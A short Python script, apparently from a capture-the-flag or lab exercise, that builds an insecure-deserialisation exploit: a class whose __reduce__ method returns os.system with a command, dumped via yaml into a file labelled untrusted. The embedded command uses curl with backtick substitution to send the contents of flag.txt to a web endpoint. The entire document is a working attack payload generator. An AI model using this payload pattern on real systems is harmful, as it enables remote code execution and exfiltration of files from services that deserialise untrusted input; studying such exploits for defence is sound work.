import pickle
import os
import yaml

class Exploit(object):
    def __reduce__(object):
        command = 'curl http://localhost:5000/api/values?data=`cat flag.txt `'
        return(os.system, (command,))


print(Exploit())
serialized = yaml.dump(Exploit())
filename = 'curl-serialized.untrusted'

with open(filename, 'w') as file_object:
    file_object.write(serialized)

